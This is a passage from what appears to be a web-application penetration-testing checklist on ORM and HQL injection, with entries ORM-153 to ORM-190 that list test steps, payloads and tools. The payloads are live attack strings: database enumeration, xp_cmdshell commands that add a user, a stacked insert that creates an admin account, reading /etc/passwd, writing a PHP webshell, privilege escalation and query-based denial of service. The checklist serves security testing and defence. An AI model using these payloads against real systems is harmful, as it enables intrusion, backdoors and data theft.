**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-153 — ORM Injection - UNION-Based Column Count Detection
**Test Category:** Union Exploitation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Incrementally add NULL columns to UNION SELECT to find correct column count

**Expected Result:** No error when column count matches

**Payload Example:**

```
' UNION SELECT NULL-- / ' UNION SELECT NULL,NULL-- (increment)
```

**Impact:** UNION-based extraction via ORM raw/native query, cross-table read

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-154 — ORM Injection - UNION-Based Data Type Detection
**Test Category:** Union Exploitation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Replace NULLs with typed values (string, int) to identify column data types

**Expected Result:** Correct type accepted without error

**Payload Example:**

```
' UNION SELECT 'a',NULL,NULL--
```

**Impact:** UNION-based extraction via ORM raw/native query, cross-table read

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-155 — ORM Injection - UNION-Based Table Enumeration
**Test Category:** Union Exploitation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use information_schema to enumerate tables via UNION

**Expected Result:** Table names extracted

**Payload Example:**

```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Impact:** UNION-based extraction via ORM raw/native query, cross-table read

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-156 — ORM Injection - UNION-Based Column Enumeration
**Test Category:** Union Exploitation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use information_schema to enumerate columns via UNION

**Expected Result:** Column names extracted

**Payload Example:**

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Impact:** UNION-based extraction via ORM raw/native query, cross-table read

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-157 — ORM Injection - Stored Procedure Invocation
**Test Category:** Advanced Exploitation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Stored procedures via ORM

**Test Steps:** Invoke stored procedures through ORM injection

**Expected Result:** Stored procedure executes (e.g. xp_cmdshell)

**Payload Example:**

```
'; EXEC xp_cmdshell 'whoami'--
```

**Impact:** Advanced ORM-injection exploitation (stacked/native/RCE paths)

**Tools:** sqlmap --os-shell

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-158 — ORM Injection - Stacked Queries
**Test Category:** Advanced Exploitation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Test if ORM/DB driver supports stacked queries for multi-statement execution

**Expected Result:** Second query executes

**Payload Example:**

```
'; INSERT INTO users(name,role) VALUES('evil','admin');--
```

**Impact:** Advanced ORM-injection exploitation (stacked/native/RCE paths)

**Tools:** sqlmap --technique=S

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-159 — ORM Injection - File Read via ORM
**Test Category:** Advanced Exploitation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use database file read functions through ORM injection

**Expected Result:** Server file contents extracted

**Payload Example:**

```
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
```

**Impact:** Advanced ORM-injection exploitation (stacked/native/RCE paths)

**Tools:** sqlmap --file-read

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-160 — ORM Injection - File Write via ORM
**Test Category:** Advanced Exploitation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use database file write functions through ORM injection

**Expected Result:** Webshell or file written to server

**Payload Example:**

```
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'--
```

**Impact:** Advanced ORM-injection exploitation (stacked/native/RCE paths)

**Tools:** sqlmap --file-write --file-dest

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-161 — ORM Injection - OS Command Execution
**Test Category:** Advanced Exploitation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Achieve OS command execution through ORM injection (xp_cmdshell, sys_exec, etc.)

**Expected Result:** OS commands execute on server

**Payload Example:**

```
'; EXEC xp_cmdshell 'net user evil Pass123 /add'--
```

**Impact:** Advanced ORM-injection exploitation (stacked/native/RCE paths)

**Tools:** sqlmap --os-cmd/--os-shell

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-162 — ORM Injection - Privilege Escalation in DB
**Test Category:** Advanced Exploitation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Escalate database user privileges through ORM injection

**Expected Result:** DB user gains DBA/superuser role

**Payload Example:**

```
'; GRANT DBA TO current_user;-- / ALTER USER current_user SUPERUSER;
```

**Impact:** Advanced ORM-injection exploitation (stacked/native/RCE paths)

**Tools:** sqlmap --privileges

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-163 — ORM Injection - Data Exfiltration via Error Grouping
**Test Category:** Advanced Exploitation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use GROUP BY / ORDER BY with subqueries for error-based extraction

**Expected Result:** Data leaked in error messages

**Payload Example:**

```
' GROUP BY CONCAT(version(),FLOOR(RAND(0)*2))--
```

**Impact:** Advanced ORM-injection exploitation (stacked/native/RCE paths)

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-164 — ORM Injection - LIMIT/OFFSET Injection
**Test Category:** Parameter-Specific · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Pagination parameters

**Test Steps:** Inject SQL into pagination parameters (limit/offset/page/per_page)

**Expected Result:** SQL injection via pagination

**Payload Example:**

```
limit=10;SELECT pg_sleep(5)-- / offset=0 UNION SELECT 1--
```

**Impact:** Parameter-level ORM injection (filter/sort/limit/offset)

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-165 — ORM Injection - Batch Query Injection
**Test Category:** Parameter-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Batch/bulk API endpoints

**Test Steps:** Inject malicious entries in batch/bulk create/update payloads

**Expected Result:** One of many items in batch triggers injection

**Payload Example:**

```
[{"name":"safe"},{"name":"' OR 1=1--"}]
```

**Impact:** Parameter-level ORM injection (filter/sort/limit/offset)

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-166 — ORM Injection via File Metadata
**Test Category:** Parameter-Specific · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** File upload with DB metadata

**Test Steps:** Inject ORM payloads in file metadata (filename, EXIF) that gets stored via ORM

**Expected Result:** Injection triggers when metadata queried

**Payload Example:**

```
Upload file named: ' OR 1=1--.jpg
```

**Impact:** Parameter-level ORM injection (filter/sort/limit/offset)

**Tools:** Burp Suite, exiftool

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-167 — ORM Injection via HTTP Headers
**Test Category:** Parameter-Specific · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** User-Agent / Referer headers

**Test Steps:** Inject ORM payloads in headers if they're stored/queried via ORM

**Expected Result:** Injection triggers when header value used in ORM query

**Payload Example:**

```
User-Agent: ' OR 1=1--
```

**Impact:** Parameter-level ORM injection (filter/sort/limit/offset)

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-168 — ORM Injection via Cookies
**Test Category:** Parameter-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cookie values

**Test Steps:** Inject ORM payloads in cookie values if used in ORM queries

**Expected Result:** Injection via cookie-based query

**Payload Example:**

```
Cookie: session=' OR 1=1--
```

**Impact:** Parameter-level ORM injection (filter/sort/limit/offset)

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-169 — ORM Injection - Second Order via Profile Fields
**Test Category:** Second-Order · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Store ORM injection payload in profile/name field, triggered when admin views

**Expected Result:** Payload executes when stored value used in later query

**Payload Example:**

```
Set name to: ' OR 1=1-- (triggers in admin dashboard query)
```

**Impact:** Second-order ORM injection: stored input reaches a later query

**Tools:** Burp Suite, manual chaining

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-170 — ORM Injection - Second Order via Log Analysis
**Test Category:** Second-Order · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Store injection payload that triggers when log analysis queries process it

**Expected Result:** Payload executes during log aggregation queries

**Payload Example:**

```
Set User-Agent to: '; SELECT * FROM users-- (triggers in analytics query)
```

**Impact:** Second-order ORM injection: stored input reaches a later query

**Tools:** Manual testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-171 — ORM Injection - Input Validation Boundary Test
**Test Category:** Boundary Testing · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Test maximum length inputs, special characters, null bytes, unicode in ORM parameters

**Expected Result:** Application handles edge cases unsafely

**Payload Example:**

```
Send 10000-char string / null bytes / unicode chars in each parameter
```

**Impact:** Boundary/edge input probing ORM parsing for injection

**Tools:** Burp Intruder, wfuzz

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-172 — ORM Injection - Numeric Parameter Type Juggling
**Test Category:** Boundary Testing · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Send string values for expected numeric parameters to trigger type errors

**Expected Result:** Type conversion reveals ORM details or allows injection

**Payload Example:**

```
id=1' / id=1 OR 1=1 / id[]=1
```

**Impact:** Boundary/edge input probing ORM parsing for injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-173 — ORM Injection - Array Parameter Injection
**Test Category:** Boundary Testing · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Send array values for expected scalar parameters

**Expected Result:** ORM processes array differently than expected

**Payload Example:**

```
id[]=1&id[]=2 / name[0]=admin
```

**Impact:** Boundary/edge input probing ORM parsing for injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-174 — ORM Injection - Empty/Null Value Handling
**Test Category:** Boundary Testing · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Send empty strings, null, undefined, None for each parameter

**Expected Result:** ORM handles null unsafely

**Payload Example:**

```
param= / param=null / param=undefined / param=None
```

**Impact:** Boundary/edge input probing ORM parsing for injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-175 — ORM Injection - Boolean Parameter Manipulation
**Test Category:** Boundary Testing · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Send various boolean representations

**Expected Result:** Type confusion in ORM boolean handling

**Payload Example:**

```
active=true/false/1/0/yes/no/TRUE/FALSE
```

**Impact:** Boundary/edge input probing ORM parsing for injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-176 — ORM Injection - Wildcard / Glob Injection
**Test Category:** Pattern Matching · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM search endpoint

**Test Steps:** Inject SQL/ORM wildcard characters to enumerate data

**Expected Result:** Wildcard causes broader match than intended

**Payload Example:**

```
search=% / search=_ / search=* / search=[a-z]
```

**Impact:** LIKE/regex ORM predicate injection widening result sets

**Tools:** Burp Intruder

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-177 — ORM DoS - Expensive Query Injection
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject queries that cause expensive operations (Cartesian joins, heavy regex)

**Expected Result:** Server response time dramatically increases

**Payload Example:**

```
' OR 1=1 ORDER BY 1,2,3,4,...,100-- / LIKE '%a%a%a%a%a%a%'
```

**Impact:** ORM-driven resource exhaustion / query DoS

**Tools:** Burp Suite

**References:** CWE-400; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-178 — ORM DoS - Resource Exhaustion via Deep Nesting
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Send deeply nested JSON objects that cause recursive ORM processing

**Expected Result:** Server CPU/memory spike

**Payload Example:**

```
{"a":{"b":{"c":{"d":{"e":{...100 levels...}}}}}}
```

**Impact:** ORM-driven resource exhaustion / query DoS

**Tools:** Custom script

**References:** CWE-400; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-179 — ORM DoS - Large IN Clause Injection
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject very large IN clause through ORM

**Expected Result:** Query execution slow/timeout

**Payload Example:**

```
id[$in][0]=1&id[$in][1]=2&...&id[$in][9999]=10000
```

**Impact:** ORM-driven resource exhaustion / query DoS

**Tools:** Custom script

**References:** CWE-400; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-180 — ORM Information Disclosure - Verbose Error Messages
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Trigger various errors and analyze error messages for ORM/DB details

**Expected Result:** Error messages reveal ORM type, DB type, table names, query structure

**Payload Example:**

```
Submit various malformed inputs and analyze 500 responses
```

**Impact:** ORM error/behaviour leaks schema, entity &amp; field names

**Tools:** Burp Suite, grep

**References:** CWE-200; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-181 — ORM Information Disclosure - Debug Mode Detection
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Check if application is in debug mode exposing ORM queries

**Expected Result:** Full SQL queries visible in response/debug toolbar

**Payload Example:**

```
Look for: Django Debug Toolbar / Hibernate show_sql / query log in response
```

**Impact:** ORM error/behaviour leaks schema, entity &amp; field names

**Tools:** Browser, Burp Suite

**References:** CWE-200; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-182 — ORM Information Disclosure - Query Timing Analysis
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Measure response times for different inputs to infer query structure

**Expected Result:** Timing differences reveal query complexity/structure

**Payload Example:**

```
Compare: valid ID (fast) vs invalid ID (fast) vs complex payload (slow)
```

**Impact:** ORM error/behaviour leaks schema, entity &amp; field names

**Tools:** Burp Suite timing analysis

**References:** CWE-200; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-183 — HQL Injection - Entity Traversal via Relationships
**Test Category:** HQL Advanced · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Hibernate/JPA endpoints

**Test Steps:** Navigate entity relationships in HQL to access related data

**Expected Result:** Data from related entities accessed

**Payload Example:**

```
' AND (SELECT u.secretField FROM User u WHERE u.id=1) IS NOT NULL AND '1'='1
```

**Impact:** Advanced HQL injection: cross-entity data extraction &amp; query manipulation

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-184 — HQL Injection - Named Query Parameter Pollution
**Test Category:** HQL Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Hibernate/JPA endpoints

**Test Steps:** If named queries are used, attempt to override named parameters

**Expected Result:** Named query parameters overridden

**Payload Example:**

```
name=:param1&param1=' OR 1=1--
```

**Impact:** Advanced HQL injection: cross-entity data extraction &amp; query manipulation

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-185 — HQL Injection - Criteria API Unsafe Usage
**Test Category:** HQL Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Hibernate/JPA endpoints

**Test Steps:** Test if Criteria API methods receive unsanitized user input

**Expected Result:** Injection via Criteria restrictions

**Payload Example:**

```
field=name&op=like&value=%25admin%25
```

**Impact:** Advanced HQL injection: cross-entity data extraction &amp; query manipulation

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-186 — Django ORM - F() Expression Injection
**Test Category:** Django Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django endpoints

**Test Steps:** Inject into F() expressions if field names from user input

**Expected Result:** Cross-field comparison manipulation

**Payload Example:**

```
field=password (F('password') used in comparison)
```

**Impact:** Advanced Django ORM abuse: relation traversal &amp; extra() SQL injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-187 — Django ORM - Subquery Injection via OuterRef
**Test Category:** Django Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django endpoints

**Test Steps:** Inject into Subquery/OuterRef if fields from user input

**Expected Result:** Subquery accesses unintended fields

**Payload Example:**

```
subfield=password
```

**Impact:** Advanced Django ORM abuse: relation traversal &amp; extra() SQL injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-188 — Django ORM - Window Function Injection
**Test Category:** Django Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django endpoints

**Test Steps:** Inject into Window() expressions if parameters from user input

**Expected Result:** Window function manipulation

**Payload Example:**

```
window_field=password&order=password
```

**Impact:** Advanced Django ORM abuse: relation traversal &amp; extra() SQL injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-189 — Sequelize - scope() Injection
**Test Category:** Sequelize Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sequelize endpoints

**Test Steps:** Inject into Model.scope() if scope name from user input

**Expected Result:** Unintended scope applied revealing more data

**Payload Example:**

```
scope=withPassword / scope=allRecords
```

**Impact:** Advanced Sequelize injection: nested operators &amp; raw-query exposure

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-190 — Sequelize - include (Eager Loading) Injection
**Test Category:** Sequelize Advanced · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sequelize endpoints

**Test Steps:** Inject model names into include parameter for eager loading

**Expected Result:** Sensitive related models loaded and returned

**Payload Example:**

```
include[0][model]=Secret&include[0][attributes][]=value
```

**Impact:** Advanced Sequelize injection: nested operators &amp; raw-query exposure

**Tools:** Burp Suite

